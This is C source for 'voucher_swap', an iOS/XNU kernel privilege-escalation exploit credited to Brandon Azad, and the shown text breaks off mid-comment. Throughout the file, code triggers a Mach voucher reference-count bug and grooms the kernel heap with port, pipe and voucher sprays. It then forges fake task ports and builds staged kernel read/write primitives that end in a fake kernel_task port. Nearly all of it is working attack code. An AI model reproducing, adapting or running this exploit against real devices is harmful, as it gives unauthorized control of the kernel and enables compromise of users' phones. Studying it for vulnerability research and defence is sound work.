/*
 * voucher_swap.c
 * Brandon Azad
 */
#include "voucher_swap.h"

#include <assert.h>
#include <mach/mach.h>
#include <stdlib.h>
#include <unistd.h>
#include <CoreFoundation/CoreFoundation.h>

#include "ipc_port.h"
#include "kernel_alloc.h"
#include "kernel_memory.h"
#include "kernel_slide.h"
#include "log.h"
#include "mach_vm.h"
#include "parameters.h"
#include "platform.h"
#include "common.h"


// ---- Global parameters -------------------------------------------------------------------------

// The size of our fake task.
//
// This needs to be updated if the task offsets in parameters.h grow.
#define FAKE_TASK_SIZE 0x380

// ---- Global state ------------------------------------------------------------------------------

// Stash the host port for create_voucher().
static mach_port_t host;

// The base port. This port is located at a fixed offset from the fake port.
mach_port_t base_port;

// The fake port. This is a send right to a port that overlaps our pipe buffer, so we can control
// its contents.
mach_port_t fake_port;

// The read/write file descriptors for the pipe whose buffer overlaps fake_port.
int pipefds[2];

// The contents of the pipe buffer.
void *pipe_buffer;

// The size of the pipe buffer.
size_t pipe_buffer_size;

// The offset of the fake port in the pipe buffer.
size_t fake_port_offset;

// The offset of the fake task in the pipe buffer.
size_t fake_task_offset;

// The address of base_port.
uint64_t base_port_address;

// The address of fake_port.
uint64_t fake_port_address;

// The address of the pipe buffer.
uint64_t pipe_buffer_address;

// ---- Voucher functions -------------------------------------------------------------------------

/*
 * create_voucher
 *
 * Description:
 * 	Create a Mach voucher. If id is unique, then this will be a unique voucher (until another
 * 	call to this function with the same id).
 *
 * 	A Mach voucher port for the voucher is returned. A fresh voucher has 1 voucher reference
 * 	and a voucher port that has 2 references and 1 send right.
 */
static mach_port_t
create_voucher(uint64_t id) {
	assert(host != MACH_PORT_NULL);
	static uint64_t uniqueness_token = 0;
	if (uniqueness_token == 0) {
		uniqueness_token = (((uint64_t)arc4random()) << 32) | getpid();
	}
	mach_port_t voucher = MACH_PORT_NULL;
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wgnu-variable-sized-type-not-at-end"
	struct __attribute__((packed)) {
		mach_voucher_attr_recipe_data_t user_data_recipe;
		uint64_t user_data_content[2];
	} recipes = {};
#pragma clang diagnostic pop
	recipes.user_data_recipe.key = MACH_VOUCHER_ATTR_KEY_USER_DATA;
	recipes.user_data_recipe.command = MACH_VOUCHER_ATTR_USER_DATA_STORE;
	recipes.user_data_recipe.content_size = sizeof(recipes.user_data_content);
	recipes.user_data_content[0] = uniqueness_token;
	recipes.user_data_content[1] = id;
	kern_return_t kr = host_create_mach_voucher(
			host,
			(mach_voucher_attr_raw_recipe_array_t) &recipes,
			sizeof(recipes),
			&voucher);
	assert(kr == KERN_SUCCESS);
	assert(MACH_PORT_VALID(voucher));
	return voucher;
}

/*
 * voucher_tweak_references
 *
 * Description:
 * 	Use the task_swap_mach_voucher() vulnerabilities to modify the reference counts of 2
 * 	vouchers.
 */
static void
voucher_tweak_references(mach_port_t release_voucher, mach_port_t reference_voucher) {
	// Call task_swap_mach_voucher() to tweak the reference counts (two bugs in one!).
	mach_port_t inout_voucher = reference_voucher;
	kern_return_t kr = task_swap_mach_voucher(mach_task_self(), release_voucher, &inout_voucher);
	if (kr != KERN_SUCCESS) {
		ERROR("%s returned %d: %s", "task_swap_mach_voucher", kr, mach_error_string(kr));
	}
	// At this point we've successfully tweaked the voucher reference counts, but our port
	// reference counts might be messed up because of the voucher port returned in
	// inout_voucher! We need to deallocate it (it's extra anyways, since
	// task_swap_mach_voucher() doesn't swallow the existing send rights).
	if (kr == KERN_SUCCESS && MACH_PORT_VALID(inout_voucher)) {
		kr = mach_port_deallocate(mach_task_self(), inout_voucher);
		assert(kr == KERN_SUCCESS);
	}
}

/*
 * voucher_reference
 *
 * Description:
 * 	Add a reference to the voucher represented by the voucher port.
 */
static void
voucher_reference(mach_port_t voucher) {
	voucher_tweak_references(MACH_PORT_NULL, voucher);
}

/*
 * voucher_release
 *
 * Description:
 * 	Release a reference on the voucher represented by the voucher port.
 */
static void
voucher_release(mach_port_t voucher) {
	voucher_tweak_references(voucher, MACH_PORT_NULL);
}

/*
 * create_unique_voucher
 *
 * Description:
 * 	Create a unique voucher. See create_voucher().
 */
static mach_port_t
create_unique_voucher() {
	static uint64_t unique_voucher_id = 0;
	return create_voucher(++unique_voucher_id);
}

/*
 * voucher_spray
 *
 * Description:
 * 	Spray a large number of Mach vouchers. Note that creating a Mach voucher also creates an
 * 	associated Mach port.
 */
static mach_port_t *
voucher_spray(size_t count) {
	mach_port_t *voucher_ports = calloc(count, sizeof(*voucher_ports));
	assert(voucher_ports != NULL);
	for (size_t i = 0; i < count; i++) {
		voucher_ports[i] = create_unique_voucher();
	}
	return voucher_ports;
}

/*
 * voucher_spray_free
 *
 * Description:
 * 	Free all the Mach vouchers (and Mach ports) in a voucher spray.
 */
static void
voucher_spray_free(mach_port_t *voucher_ports, size_t count) {
	for (size_t i = 0; i < count; i++) {
		if (MACH_PORT_VALID(voucher_ports[i])) {
			mach_port_deallocate(mach_task_self(), voucher_ports[i]);
		}
	}
	SafeFreeNULL(voucher_ports);
}

// ---- Helpers -----------------------------------------------------------------------------------

/*
 * fail
 *
 * Description:
 * 	Abort the exploit.
 */
static _Noreturn void
fail() {
	fflush(stdout);
	sleep(1);
	exit(1);
}

/*
 * iterate_ipc_vouchers_via_mach_ports
 *
 * Description:
 * 	A utility function to help iterate over an array of Mach ports as an array of vouchers in
 * 	zalloc blocks.
 */
static void
iterate_ipc_vouchers_via_mach_ports(size_t port_count, void (^callback)(size_t voucher_start)) {
	size_t ports_size = port_count * sizeof(uint64_t);
	size_t ports_per_block = BLOCK_SIZE(ipc_voucher) / sizeof(uint64_t);
	size_t ports_per_voucher = SIZE(ipc_voucher) / sizeof(uint64_t);
	// Iterate through each block.
	size_t block_count = (ports_size + BLOCK_SIZE(ipc_voucher) - 1) / BLOCK_SIZE(ipc_voucher);
	for (size_t block = 0; block < block_count; block++) {
		// Iterate through each voucher in this block.
		size_t voucher_count = ports_size / SIZE(ipc_voucher);
		if (voucher_count > COUNT_PER_BLOCK(ipc_voucher)) {
			voucher_count = COUNT_PER_BLOCK(ipc_voucher);
		}
		for (size_t voucher = 0; voucher < voucher_count; voucher++) {
			callback(ports_per_block * block + ports_per_voucher * voucher);
		}
		ports_size -= BLOCK_SIZE(ipc_voucher);
	}
}

/*
 * iterate_ipc_ports
 *
 * Description:
 * 	A utility function to help iterate over data as an array of ipc_port structs in zalloc
 * 	blocks.
 */
static void
iterate_ipc_ports(size_t size, void (^callback)(size_t port_offset, bool *stop)) {
	// Iterate through each block.
	size_t block_count = (size + BLOCK_SIZE(ipc_port) - 1) / BLOCK_SIZE(ipc_port);
	bool stop = false;
	for (size_t block = 0; !stop && block < block_count; block++) {
		// Iterate through each port in this block.
		size_t port_count = size / SIZE(ipc_port);
		if (port_count > COUNT_PER_BLOCK(ipc_port)) {
			port_count = COUNT_PER_BLOCK(ipc_port);
		}
		for (size_t port = 0; !stop && port < port_count; port++) {
			callback(BLOCK_SIZE(ipc_port) * block + SIZE(ipc_port) * port, &stop);
		}
		size -= BLOCK_SIZE(ipc_port);
	}
}

/*
 * read_pipe
 *
 * Description:
 * 	Read the pipe's contents. The last byte can not be retrieved.
 */
static void
read_pipe() {
	assert(pipefds[0] != pipefds[1]);
	size_t read_size = pipe_buffer_size - 1;
	ssize_t count = read(pipefds[0], pipe_buffer, read_size);
	if (count == read_size) {
		return;
	} else if (count == -1) {
		ERROR("could not read pipe buffer");
	} else if (count == 0) {
		ERROR("pipe is empty");
	} else {
		ERROR("partial read %zu of %zu bytes", count, read_size);
	}
	fail();
}

/*
 * write_pipe
 *
 * Description:
 * 	Write the pipe's contents. The last byte can not be written.
 */
static void
write_pipe() {
	assert(pipefds[0] != pipefds[1]);
	size_t write_size = pipe_buffer_size - 1;
	ssize_t count = write(pipefds[1], pipe_buffer, write_size);
	if (count == write_size) {
		return;
	} else if (count < 0) {
		ERROR("could not write pipe buffer");
	} else if (count == 0) {
		ERROR("pipe is full");
	} else {
		ERROR("partial write %zu of %zu bytes", count, write_size);
	}
	fail();
}

/*
 * mach_port_waitq_flags
 *
 * Description:
 * 	Build the flags value for the waitq embedded in a Mach port. Interestingly, the rest of the
 * 	waitq (including the next/prev pointers) need not be valid: if waitq_irq is set, then a
 * 	global waitq will be used instead of the embedded one.
 */
static inline uint32_t
mach_port_waitq_flags() {
	union waitq_flags waitq_flags = {};
	waitq_flags.waitq_type              = WQT_QUEUE;
	waitq_flags.waitq_fifo              = 1;
	waitq_flags.waitq_prepost           = 0;
	waitq_flags.waitq_irq               = 0;
	waitq_flags.waitq_isvalid           = 1;
	waitq_flags.waitq_turnstile_or_port = 1;
	return waitq_flags.flags;
}

// A message to stash a value in kernel memory.
struct fake_task_msg {
	mach_msg_header_t header;
	uint8_t task_data[FAKE_TASK_SIZE];
};

/*
 * stage0_send_fake_task_message
 *
 * Description:
 * 	Send a fake task_t in a message to the fake port.
 */
static void
stage0_send_fake_task_message(uint64_t proc, uint64_t *offset_from_kmsg_to_fake_task) {
	// Create the message containing the fake task.
	struct fake_task_msg msg = {};
	msg.header.msgh_bits        = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, 0, 0, 0);
	msg.header.msgh_remote_port = fake_port;
	msg.header.msgh_size        = sizeof(msg);
	msg.header.msgh_id          = 'task';
	uint8_t *fake_task = msg.task_data;
	memset(fake_task, 0xab, sizeof(msg.task_data));
	*(uint64_t *)(fake_task + OFFSET(task, ref_count)) = 2;
	*(uint64_t *)(fake_task + OFFSET(task, bsd_info))  = proc;
	// Send the message to the port.
	kern_return_t kr = mach_msg(
			&msg.header,
			MACH_SEND_MSG | MACH_SEND_TIMEOUT,
			sizeof(msg),
			0,
			MACH_PORT_NULL,
			0,
			MACH_PORT_NULL);
	if (kr != KERN_SUCCESS) {
		ERROR("%s returned %d: %s", "mach_msg", kr, mach_error_string(kr));
		ERROR("could not send fake task message");
		fail();
	}
	// Now figure out the address of the fake task inside the message.
	// +-----------------+---+--------+------+---------+
	// | struct ipc_kmsg |   | header | task | trailer |
	// +-----------------+---+--------+------+---------+
	size_t kalloc_size = kalloc_size_for_message_size(sizeof(msg));
	*offset_from_kmsg_to_fake_task = kalloc_size - MAX_TRAILER_SIZE - sizeof(msg.task_data);
}

/*
 * stage0_read32
 *
 * Description:
 * 	Read a 32-bit value from memory using our fake port.
 *
 * 	Note that this is the very first read primitive we get, before we know the address of the
 * 	pipe buffers. Each 32-bit read leaks an ipc_kmsg. We'll want to use this primitive to get
 * 	the address of our pipe buffers as quickly as possible.
 *
 * 	This routine performs 2 full pipe transfers, starting with a read.
 */
static uint32_t
stage0_read32(uint64_t address, uint64_t *kmsg) {
	// Do a read to make the pipe available for a write.
	read_pipe();
	// Initialize the port as a regular Mach port that's empty and has room for 1 message.
	uint8_t *fake_port_data = (uint8_t *) pipe_buffer + fake_port_offset;
	FIELD(fake_port_data, ipc_port, ip_bits,      uint32_t) = io_makebits(1, IOT_PORT, IKOT_NONE);
	FIELD(fake_port_data, ipc_port, waitq_flags,  uint32_t) = mach_port_waitq_flags();
	FIELD(fake_port_data, ipc_port, imq_messages, uint64_t) = 0;
	FIELD(fake_port_data, ipc_port, imq_msgcount, uint16_t) = 0;
	FIELD(fake_port_data, ipc_port, imq_qlimit,   uint16_t) = 1;
	write_pipe();
	// We'll pretend that the 32-bit value we want to read is the p_pid field of a proc struct.
	// Then, we'll get a pointer to that fake proc at a known address in kernel memory by
	// sending the pointer to the fake proc in a Mach message to the fake port.
	uint64_t fake_proc_address = address - OFFSET(proc, p_pid);
	uint64_t offset_from_kmsg_to_fake_task;
	stage0_send_fake_task_message(fake_proc_address, &offset_from_kmsg_to_fake_task);
	// Read back the port contents to get the address of the ipc_kmsg containing our fake proc
	// pointer.
	read_pipe();
	uint64_t kmsg_address = FIELD(fake_port_data, ipc_port, imq_messages, uint64_t);
	*kmsg = kmsg_address;
	// Now rewrite the port as a fake task port pointing to our fake task.
	uint64_t fake_task_address = kmsg_address + offset_from_kmsg_to_fake_task;
	FIELD(fake_port_data, ipc_port, ip_bits,    uint32_t) = io_makebits(1, IOT_PORT, IKOT_TASK);
	FIELD(fake_port_data, ipc_port, ip_kobject, uint64_t) = fake_task_address;
	write_pipe();
	// Now use pid_for_task() to read our value.
	int pid = -1;
	kern_return_t kr = pid_for_task(fake_port, &pid);
	if (kr != KERN_SUCCESS) {
		ERROR("%s returned %d: %s", "pid_for_task", kr, mach_error_string(kr));
		ERROR("could not read kernel memory in stage %d using %s", 0, "pid_for_task");
		fail();
	}
	return (uint32_t) pid;
}

/*
 * stage0_read64
 *
 * Description:
 * 	Read a 64-bit value from kernel memory using our stage 0 read primitive.
 *
 * 	2 ipc_kmsg allocations will be leaked.
 */
static uint64_t
stage0_read64(uint64_t address, uint64_t *kmsgs) {
	union {
		uint32_t value32[2];
		uint64_t value64;
	} u;
	u.value32[0] = stage0_read32(address, &kmsgs[0]);
	u.value32[1] = stage0_read32(address + 4, &kmsgs[1]);
	return u.value64;
}

/*
 * stage1_read32
 *
 * Description:
 * 	Read a 32-bit value from kernel memory using our fake port.
 *
 * 	This primitive requires that we know the address of the pipe buffer containing our port.
 */
static uint32_t
stage1_read32(uint64_t address) {
	// Do a read to make the pipe available for a write.
	read_pipe();
	// Create our fake task. The task's proc's p_pid field overlaps with the address we want to
	// read.
	uint64_t fake_proc_address = address - OFFSET(proc, p_pid);
	uint64_t fake_task_address = pipe_buffer_address + fake_task_offset;
	uint8_t *fake_task = (uint8_t *) pipe_buffer + fake_task_offset;
	FIELD(fake_task, task, ref_count, uint64_t) = 2;
	FIELD(fake_task, task, bsd_info,  uint64_t) = fake_proc_address;
	// Initialize the port as a fake task port pointing to our fake task.
	uint8_t *fake_port_data = (uint8_t *) pipe_buffer + fake_port_offset;
	FIELD(fake_port_data, ipc_port, ip_bits,    uint32_t) = io_makebits(1, IOT_PORT, IKOT_TASK);
	FIELD(fake_port_data, ipc_port, ip_kobject, uint64_t) = fake_task_address;
	// Write our buffer to kernel memory.
	write_pipe();
	// Now use pid_for_task() to read our value.
	int pid = -1;
	kern_return_t kr = pid_for_task(fake_port, &pid);
	if (kr != KERN_SUCCESS) {
		ERROR("%s returned %d: %s", "pid_for_task", kr, mach_error_string(kr));
		ERROR("could not read kernel memory in stage %d using %s", 1, "pid_for_task");
		fail();
	}
	return (uint32_t) pid;
}

/*
 * stage1_read64
 *
 * Description:
 * 	Read a 64-bit value from kernel memory using our stage 1 read primitive.
 */
static uint64_t
stage1_read64(uint64_t address) {
	union {
		uint32_t value32[2];
		uint64_t value64;
	} u;
	u.value32[0] = stage1_read32(address);
	u.value32[1] = stage1_read32(address + 4);
	return u.value64;
}

/*
 * stage1_find_port_address
 *
 * Description:
 * 	Get the address of a Mach port to which we hold a send right.
 */
static uint64_t
stage1_find_port_address(mach_port_t port) {
	// Create the message. We'll place a send right to the target port in msgh_local_port.
	mach_msg_header_t msg = {};
	msg.msgh_bits        = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_MAKE_SEND, MACH_MSG_TYPE_COPY_SEND, 0, 0);
	msg.msgh_remote_port = base_port;
	msg.msgh_local_port  = port;
	msg.msgh_size        = sizeof(msg);
	msg.msgh_id          = 'port';
	// Send the message to the base port.
	kern_return_t kr = mach_msg(
			&msg,
			MACH_SEND_MSG | MACH_SEND_TIMEOUT,
			sizeof(msg),
			0,
			MACH_PORT_NULL,
			0,
			MACH_PORT_NULL);
	if (kr != KERN_SUCCESS) {
		ERROR("%s returned %d: %s", "mach_msg", kr, mach_error_string(kr));
		ERROR("could not stash our port in a message to the base port");
		fail();
	}
	// Read the address of the kmsg.
	uint64_t base_port_imq_messages = base_port_address + OFFSET(ipc_port, imq_messages);
	uint64_t kmsg = stage1_read64(base_port_imq_messages);
	// Read the message's msgh_local_port field to get the address of the target port.
	// +-----------------+---+--------+---------+
	// | struct ipc_kmsg |   | header | trailer |
	// +-----------------+---+--------+---------+
	uint64_t msgh_local_port = kmsg + ipc_kmsg_size_for_message_size(sizeof(msg))
		- MAX_TRAILER_SIZE - (sizeof(mach_msg_header_t) + MACH_HEADER_SIZE_DELTA)
		+ (sizeof(uint32_t) + sizeof(uint32_t) + sizeof(uint64_t));
	uint64_t port_address = stage1_read64(msgh_local_port);
	// Discard the message.
	port_discard_messages(base_port);
	return port_address;
}

/*
 * stage1_check_kernel_task_port
 *
 * Description:
 * 	Check if the given ipc_port is a task port for the kernel task.
 */
static bool
stage1_check_kernel_task_port(uint64_t candidate_port, uint64_t *kernel_task_address) {
	// Check the ip_bits field.
	uint32_t ip_bits = stage1_read32(candidate_port + OFFSET(ipc_port, ip_bits));
	if (ip_bits != io_makebits(1, IOT_PORT, IKOT_TASK)) {
		return false;
	}
	// This is a task port. Get the task.
	uint64_t task = stage1_read64(candidate_port + OFFSET(ipc_port, ip_kobject));
	// Now get the task's PID.
	uint64_t proc = stage1_read64(task + OFFSET(task, bsd_info));
	uint32_t pid = stage1_read32(proc + OFFSET(proc, p_pid));
	// The kernel task has pid 0.
	if (pid != 0) {
		return false;
	}
	// Found it!
	*kernel_task_address = task;
	return true;
}

/*
 * build_fake_kernel_task
 *
 * Description:
 * 	Build a fake kernel_task and kernel_task port in the specified data.
 */
static void
build_fake_kernel_task(void *data, uint64_t kernel_address,
		size_t task_offset, size_t port_offset,
		uint64_t ipc_space_kernel, uint64_t kernel_map) {
	// Create our fake kernel_task.
	uint8_t *fake_task = (uint8_t *) data + task_offset;
	uint64_t fake_task_address = kernel_address + task_offset;
	FIELD(fake_task, task, lck_mtx_type, uint8_t)  = 0x22;
	FIELD(fake_task, task, ref_count,    uint64_t) = 4;
	FIELD(fake_task, task, active,       uint32_t) = 1;
	FIELD(fake_task, task, map,          uint64_t) = kernel_map;
	// Initialize the port as a fake task port pointing to our fake kernel_task.
	uint8_t *fake_port_data = (uint8_t *) data + port_offset;
	FIELD(fake_port_data, ipc_port, ip_bits,       uint32_t) = io_makebits(1, IOT_PORT, IKOT_TASK);
	FIELD(fake_port_data, ipc_port, ip_references, uint32_t) = 4;
	FIELD(fake_port_data, ipc_port, ip_receiver,   uint64_t) = ipc_space_kernel;
	FIELD(fake_port_data, ipc_port, ip_kobject,    uint64_t) = fake_task_address;
	FIELD(fake_port_data, ipc_port, ip_mscount,    uint32_t) = 1;
	FIELD(fake_port_data, ipc_port, ip_srights,    uint32_t) = 1;
}

/*
 * stage2_init
 *
 * Description:
 * 	Initialize the stage 2 kernel read/write primitives. After this,
 * 	kernel_read()/kernel_write() should work.
 */
static void
stage2_init(uint64_t ipc_space_kernel, uint64_t kernel_map) {
	// Do a read to make the pipe available for a write.
	read_pipe();
	// Create our fake kernel_task and port.
	build_fake_kernel_task(pipe_buffer, pipe_buffer_address,
			fake_task_offset, fake_port_offset,
			ipc_space_kernel, kernel_map);
	// Write our buffer to kernel memory.
	write_pipe();
	// Initialize kernel_memory.h.
	kernel_task_port = fake_port;
}

/*
 * stage3_init
 *
 * Description:
 * 	Initialize the stage 3 kernel read/write primitives. After this, it's safe to free all
 * 	other resources.
 *
 * 	TODO: In the future we should use mach_vm_remap() here to actually get a second copy of the
 * 	real kernel_task.
 */
static bool
stage3_init(uint64_t ipc_space_kernel, uint64_t kernel_map) {
	bool success = false;
	size_t size = 0x800;
	// Allocate some virtual memory.
	mach_vm_address_t page;
	kern_return_t kr = mach_vm_allocate(fake_port, &page, size, VM_FLAGS_ANYWHERE);
	if (kr != KERN_SUCCESS) {
		ERROR("%s returned %d: %s", "mach_vm_allocate", kr, mach_error_string(kr));
		goto fail_0;
	}
	// Build the contents we want.
	uint8_t *data = calloc(1, size);
	assert(data != NULL);
	build_fake_kernel_task(data, page, SIZE(ipc_port), 0, ipc_space_kernel, kernel_map);
	uint64_t fake_port_address = page;
	// Copy the contents into the kernel.
	bool ok = kernel_write(page, data, size);
	if (!ok) {
		ERROR("could not write fake kernel_task into kernel memory");
		goto fail_1;
	}
	// Modify fake_port's ipc_entry so that it points to our new fake port.
	uint64_t ipc_entry;
	ok = kernel_ipc_port_lookup(current_task, fake_port, NULL, &ipc_entry);
	if (!ok) {
		ERROR("could not look up the IPC entry for the fake port");
		fail();
	}
	kernel_write64(ipc_entry + OFFSET(ipc_entry, ie_object), fake_port_address);
	// Clear ie_request to avoid a panic on termination.
	kernel_write32(ipc_entry + OFFSET(ipc_entry, ie_request), 0);
	// At this point fake_port has been officially donated to kernel_task_port.
	fake_port = MACH_PORT_NULL;
	success = true;
fail_1:
	SafeFreeNULL(data);
fail_0:
	return success;
}

/*
 * clean_up
 *
 * Description:
 * 	Clean up our bad state after the exploit.
 */
static void
clean_up(mach_port_t dangling_voucher, uint64_t ip_requests,
		uint64_t *leaked_kmsgs, size_t leaked_kmsg_count) {
	// First look up the address of the voucher port and the ipc_entry.
	uint64_t voucher_port;
	uint64_t voucher_port_entry;
	bool ok = kernel_ipc_port_lookup(current_task, dangling_voucher,
			&voucher_port, &voucher_port_entry);
	if (!ok) {
		ERROR("could not look up voucher port 0x%x", dangling_voucher);
		fail();
	}
	// Clear the ip_kobject field, which is a dangling pointer to our freed/reallocated
	// voucher.
	kernel_write64(voucher_port + OFFSET(ipc_port, ip_kobject), 0);
	// Convert the voucher port to a regular Mach port.
	kernel_write32(voucher_port + OFFSET(ipc_port, ip_bits),
			io_makebits(1, IOT_PORT, IKOT_NONE));
	// Set the ip_receiver field to ourselves.
	uint64_t voucher_port_receiver = voucher_port + OFFSET(ipc_port, ip_receiver);
	uint64_t original_receiver = kernel_read64(voucher_port_receiver);
	uint64_t task_ipc_space = kernel_read64(current_task + OFFSET(task, itk_space));
	kernel_write64(voucher_port_receiver, task_ipc_space);
	// Transform our ipc_entry from a send right into a receive right.
	uint32_t ie_bits = kernel_read32(voucher_port_entry + OFFSET(ipc_entry, ie_bits));
	ie_bits &= ~MACH_PORT_TYPE_SEND;
	ie_bits |= MACH_PORT_TYPE_RECEIVE;
	kernel_write32(voucher_port_entry + OFFSET(ipc_entry, ie_bits), ie_bits);
	// Clear ip_nsrequest. Since we now have a receive right, we can do this directly from
	// userspace using mach_port_request_notification().
	mach_port_t prev_notify = MACH_PORT_NULL;
	kern_return_t kr = mach_port_request_notification(mach_task_self(), dangling_voucher,
			MACH_NOTIFY_NO_SENDERS, 0,
			MACH_PORT_NULL, MACH_MSG_TYPE_MAKE_SEND_ONCE,
			&prev_notify);
	if (kr != KERN_SUCCESS) {
		ERROR("%s returned %d: %s", "mach_port_request_notification",
				kr, mach_error_string(kr));
		ERROR("could not clear voucher port's %s", "ip_nsrequest");
		fail();
	}
	// Deallocate the send-once right and clear the notification.
	mach_port_deallocate(mach_task_self(), prev_notify);
	port_discard_messages(dangling_voucher);
	// Now set the ip_requests field to the leaked ip_requests from earlier.
	kernel_write64(voucher_port + OFFSET(ipc_port, ip_requests), ip_requests);
	// For each of the leaked kmsgs, store the kmsg in the port and then discard the message.
	for (size_t i = 0; i < leaked_kmsg_count; i++) {
		kernel_write64(voucher_port + OFFSET(ipc_port, imq_messages), leaked_kmsgs[i]);
		kernel_write16(voucher_port + OFFSET(ipc_port, imq_msgcount), 1);
		port_discard_messages(dangling_voucher);
	}
	// Clear the ip_receiver field since we didn't add a reference to our space.
	kernel_write64(voucher_port_receiver, original_receiver);
	// Destroy the port.
	mach_port_destroy(mach_task_self(), dangling_voucher);
	// Drop a reference on base_port.
	uint64_t base_port_references = base_port_address + OFFSET(ipc_port, ip_references);
	uint32_t ip_references = kernel_read32(base_port_references);
	kernel_write32(base_port_references, ip_references - 1);
}

// ---- Exploit -----------------------------------------------------------------------------------

void
voucher_swap() {
	kern_return_t kr;
	host = mach_host_self();
	mach_port_t thread;

	// Initialize parameters and offsets for the exploit.
	bool ok = parameters_init();
	if (!ok) {
		fail();
	}

	// 1. Create the thread whose ith_voucher field we will use during the exploit. This could
	// be the current thread, but that causes a panic if we try to perform logging while not
	// being run under a debugger, since write() will trigger an access to ith_voucher. To
	// avoid this, we create a separate thread whose ith_voucher field we can control. In order
	// for thread_set_mach_voucher() to work, we need to be sure not to start the thread.
	kr = thread_create(mach_task_self(), &thread);
	assert(kr == KERN_SUCCESS);

	// 2. Create some pipes so that we can spray pipe buffers later. We'll be limited to 16 MB
	// of pipe memory, so don't bother creating more.
    pipe_buffer_size = 16384;
	size_t pipe_count = 16 * MB / pipe_buffer_size;
	increase_file_limit();
	int *pipefds_array = create_pipes(&pipe_count);
	INFO("created %zu pipes", pipe_count);

	// 3. Spray a bunch of IPC ports. Hopefully these ports force the ipc.ports zone to grow
	// and allocate fresh pages from the zone map, so that the pipe buffers we allocate next
	// are placed directly after the ports.
	//
	// We want to do this as early as possible so that the ports are given low addresses in the
	// zone map, which increases the likelihood that bits 28-31 of the pointer are 0 (which is
	// necessary later so that the overlapping iv_refs field of the voucher is valid).
	const size_t filler_port_count = 8000;
	const size_t base_port_to_fake_port_offset = 4 * MB;
	mach_port_t *filler_ports = create_ports(filler_port_count + 1);
	INFO("created %zu ports", filler_port_count);
	// Grab the base port.
	base_port = filler_ports[filler_port_count];
	// Bump the queue limit on the first 2000 ports, which will also be used as holding ports.
	for (size_t i = 0; i < 2000; i++) {
		port_increase_queue_limit(filler_ports[i]);
	}

	// 4. Spray our pipe buffers. We're hoping that these land contiguously right after the
	// ports.
	assert(pipe_buffer_size == 16384);
	pipe_buffer = calloc(1, pipe_buffer_size);
	assert(pipe_buffer != NULL);
	assert(pipe_count <= IO_BITS_KOTYPE + 1);
	size_t pipes_sprayed = pipe_spray(pipefds_array,
			pipe_count, pipe_buffer, pipe_buffer_size,
			^(uint32_t pipe_index, void *data, size_t size) {
		// For each pipe buffer we're going to spray, initialize the possible ipc_ports
		// so that the IKOT_TYPE tells us which pipe index overlaps. We have 1024 pipes and
		// 12 bits of IKOT_TYPE data, so the pipe index should fit just fine.
		iterate_ipc_ports(size, ^(size_t port_offset, bool *stop) {
			uint8_t *port = (uint8_t *) data + port_offset;
			FIELD(port, ipc_port, ip_bits,       uint32_t) = io_makebits(1, IOT_PORT, pipe_index);
			FIELD(port, ipc_port, ip_references, uint32_t) = 1;
			FIELD(port, ipc_port, ip_mscount,    uint32_t) = 1;
			FIELD(port, ipc_port, ip_srights,    uint32_t) = 1;
		});
	});
	size_t sprayed_size = pipes_sprayed * pipe_buffer_size;
	INFO("sprayed %zu bytes to %zu pipes in kalloc.%zu",
			sprayed_size, pipes_sprayed, pipe_buffer_size);

	// 5. Spray IPC vouchers. After we trigger the vulnerability to get a dangling voucher
	// pointer, we can trigger zone garbage collection and get them reallocated with our OOL
	// ports spray.
	//
	// Assume we'll need 300 early vouchers, 6 transition blocks, 4 target block, and 6 late
	// blocks.
	const size_t voucher_spray_count = 300 + (6 + 4 + 6) * COUNT_PER_BLOCK(ipc_voucher);
	const size_t uaf_voucher_index = voucher_spray_count - 8 * COUNT_PER_BLOCK(ipc_voucher);
	mach_port_t *voucher_ports = voucher_spray(voucher_spray_count);
	INFO("created %zu vouchers", voucher_spray_count);
	mach_port_t uaf_voucher_port = voucher_ports[uaf_voucher_index];

	// 6. Spray 15% of memory in kalloc.1024 that we can free later to
	// prompt gc. We'll reuse some of the early ports from the port spray above for this.
    const size_t gc_spray_size = (kCFCoreFoundationVersionNumber >= kCFCoreFoundationVersionNumber_iOS_12_0 ? 0.15 : 0.10) * platform.memory_size;
	printf("Spray size: %ld\n", gc_spray_size);
	mach_port_t *gc_ports = filler_ports;
	size_t gc_port_count = 500;        // Use at most 500 ports for the spray.
    sprayed_size = kalloc_spray_size(gc_ports, &gc_port_count, (kCFCoreFoundationVersionNumber >= kCFCoreFoundationVersionNumber_iOS_12_0 ? 768 : 300) + 1, 1024, gc_spray_size);
	INFO("sprayed %zu bytes to %zu ports in kalloc.%u", sprayed_size, gc_port_count, 1024);
    
	// 7. Stash a pointer to an ipc_voucher in the thread's ith_voucher field and then remove
	// the added reference. That way, when we deallocate the voucher ports later, we'll be left
	// with a dangling voucher pointer in ith_voucher.
	kr = thread_set_mach_voucher(thread, uaf_voucher_port);
	assert(kr == KERN_SUCCESS);
	voucher_release(uaf_voucher_port);
	INFO("stashed voucher pointer in thread");

	// 8. Create the OOL ports pattern that we will spray to overwrite the freed voucher.
	//
	// We will reallocate the voucher to kalloc.32768, which is a convenient size since it lets
	// us very easily predict what offsets in the allocation correspond to which fields of the
	// voucher.
	assert(BLOCK_SIZE(ipc_voucher) == 16384);
	const size_t ool_port_spray_kalloc_zone = 32768;
	const size_t ool_port_count = ool_port_spray_kalloc_zone / sizeof(uint64_t);
	mach_port_t *ool_ports = calloc(ool_port_count, sizeof(mach_port_t));
	assert(ool_ports != NULL);
	// Now, walk though and initialize the "vouchers" in the ool_ports array.
	iterate_ipc_vouchers_via_mach_ports(ool_port_count, ^(size_t voucher_start) {
		// Send an OOL port one pointer past the start of the voucher. This will cause the
		// port pointer to overlap the voucher's iv_refs field, allowing us to use the
		// voucher port we'll get from thread_get_mach_voucher() later without panicking.
		// This port plays double-duty since we'll later use the reference count bug again
		// to increment the refcount/port pointer to point into our pipe buffer spray,
		// giving us a fake port.
		ool_ports[voucher_start + 1] = base_port;
		// Leave the voucher's iv_port field (index 7) as MACH_PORT_NULL, so that we can
		// call thread_get_mach_voucher() to get a new voucher port that references this
		// voucher. This is what allows us to manipulate the reference count later to
		// change the OOL port set above.
	});

	// 9. Free the first GC spray. This makes that memory available for zone garbage collection
	// in the loop below.
	destroy_ports(gc_ports, gc_port_count);

	// 10. Free the vouchers we created earlier. This leaves a voucher pointer dangling in our
	// thread's ith_voucher field. The voucher ports we created earlier are all now invalid.
	//
	// The voucher objects themselves have all been overwritten with 0xdeadbeefdeadbeef. If we
	// call thread_get_mach_voucher() here, we'll get an "os_refcnt: overflow" panic, and if we
